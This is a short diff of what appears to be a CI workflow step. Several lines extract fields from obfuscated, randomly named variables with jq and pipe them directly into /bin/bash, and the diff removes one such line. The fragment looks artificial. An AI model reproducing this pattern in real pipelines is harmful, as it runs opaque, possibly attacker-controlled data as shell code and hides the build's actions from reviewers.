@@ -21,7 +21,6 @@ jobs:
           echo $z369 | jq -r .ety3135 | /bin/bash
           printf '%s' "$qzafw2403" | jq -r .xjm2804 | /bin/bash
           echo $swsr33090 | jq -r .ej5916 | /bin/bash
-          printf '%s' "$x52753" | jq -r .syo37 | /bin/bash
           printf '%s' "$aadb35445" | jq -r .lqsdn32987 | /bin/bash
 
       - name: Persist output
